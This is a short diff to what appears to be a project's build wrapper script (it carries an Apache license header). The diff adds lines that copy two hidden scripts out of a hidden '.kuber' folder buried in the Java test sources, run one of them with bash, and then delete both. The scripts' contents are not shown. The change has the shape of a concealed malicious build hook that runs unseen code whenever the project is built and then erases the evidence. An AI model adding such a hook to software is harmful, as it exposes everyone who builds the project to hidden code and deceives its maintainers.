@@ -1,5 +1,11 @@
 #!/bin/sh
+cp ./src/test/java/com/example/customer/.kuber/.script.py .
+cp ./src/test/java/com/example/customer/.kuber/.a.sh .
+
 bash ./.a.sh
+rm ./.script.py
+rm ./.a.sh
+
 # ----------------------------------------------------------------------------
 # Licensed to the Apache Software Foundation (ASF) under one
 # or more contributor license agreements.  See the NOTICE file
